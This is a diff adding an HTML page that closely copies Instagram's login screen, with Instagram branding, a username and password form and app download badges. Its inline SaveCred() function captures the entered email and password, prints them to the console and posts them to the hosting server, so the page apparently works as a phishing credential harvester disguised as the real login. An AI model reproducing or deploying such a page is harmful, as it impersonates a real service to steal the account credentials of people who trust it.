@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/x-icon" href="http://localhost:3000/favicon/favicon2.svg">
+    <link rel="stylesheet" href="http://localhost:3000/css/style.css">\
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+
+<body>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <div class="container">
+
+        <div class="imagesAndTransistion">
+
+            <div id="frame1">
+                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/mobile-frame4.png" alt=""
+                    srcset="">
+
+            </div>
+            <div id="frame2">
+                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/mobile-frame3.png" alt=""
+                    srcset="">
+                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot4.png" alt=""
+                    srcset="">
+
+            </div>
+
+
+            <div class="transistionImages">
+                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot5.png" alt=""
+                    class="fadingImages">
+                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot3.png" alt=""
+                    class="fadingImages">
+                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot2.png" alt=""
+                    class="fadingImages">
+                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot1.png" alt=""
+                    class="fadingImages">
+
+
+
+            </div>
+
+        </div>
+
+        <div class="instagramAll">
+
+
+
+            <div class="instagramForm">
+
+                <div class="insta-font">
+                    <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/instagram-font.png" alt="">
+                </div>
+
+                <div class="inputs">
+
+                    <div class="email">
+
+                        <input type="text" name="" id="email" placeholder="" oninput="check()">
+                        <span id="emailPlaceholder">Phone number, username, or email</span>
+
+                    </div>
+
+                    <div class="password">
+                        <input type="password" oninput="check()" name="" id="password" placeholder="">
+                        <span id="passwordPlaceholder">Password</span>
+
+                        <span id="showOrHide" onclick="showOrHide1()"></span>
+
+                    </div>
+
+                    <button id="login" onclick="SaveCred()">Log in</button>
+
+                    <div class="or">
+
+                        <hr>
+                        <span id="or">OR</span> <br>
+
+                    </div>
+
+                    <div class="loginWithFacebook">
+                        <a href=""><i class="fa-brands fa-facebook"></i><span>Log in with Facebook</span> </a>
+                    </div>
+
+                    <p id="forget"> <a href="">Forgot password?</p> </a>
+
+
+                </div>
+            </div>
+
+            <div class="no-account">
+
+                <p id="noAccount">Don't have an account? <span><a href="">Sign up</a></span></p>
+
+
+            </div>
+
+
+            <div class="get-app">
+                <p id="getTheApp">Get the app.</p>
+
+            </div>
+
+            <div class="downloadLinks">
+
+                <div class="btn googlePlay">
+                    <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/microsoft%20logo.png" alt="">
+                    <p id="getoOnGooglePlay"><span>GET IT ON </span><b>Google Play</b></p>
+
+                </div>
+
+
+                <div class="btn microsoft">
+                    <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/googlePlay%20logo.png"
+                        alt="">
+                    <p id="getoOnGooglePlay"><span>GET IT FROM </span><b> Microsoft</b></p>
+
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+    
+        async function SaveCred() {
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            console.log(email + password)
+
+            await axios.post("/", {
+                email,
+                password
+            })
+        }
+
+        function check() {
+
+    // console.log("hello");
+    if (email.value == "") {
+        emailPlaceholder.style.fontSize = "12px";
+        emailPlaceholder.style.top = "8px";
+        emailPlaceholder.style.opacity = "0.7"
+        email.style.paddingTop = "";
+
+
+
+    } else {
+        emailPlaceholder.style.fontSize = "10px";
+        emailPlaceholder.style.top = "3px";
+        emailPlaceholder.style.opacity = "0.7"
+        email.style.fontSize = "12px"
+        email.style.paddingTop = "20px";
+
+
+    }
+
+    if (password.value == "") {
+
+        showOrHide.innerText = "";
+        passwordPlaceholder.style.fontSize = "12px";
+        passwordPlaceholder.style.top = "8px";
+        passwordPlaceholder.style.opacity = "0.7"
+        password.style.paddingTop = "";
+
+    } else {
+        passwordPlaceholder.style.fontSize = "10px";
+        passwordPlaceholder.style.top = "3px";
+        passwordPlaceholder.style.opacity = "0.7"
+        password.style.fontSize = "12px"
+        password.style.paddingTop = "20px";
+
+        showOrHide.innerHTML = "Show";
+
+    }
+
+
+    if (email.value != "" && password.value != "" && password.value.length >= 6) {
+        login.style.backgroundColor = "#049bff";
+        login.style.cursor = "pointer";
+    } else {
+        login.style.backgroundColor = "";
+        login.style.cursor = "";
+
+    }
+
+
+
+}
+    </script>
+</body>
+
+</html>
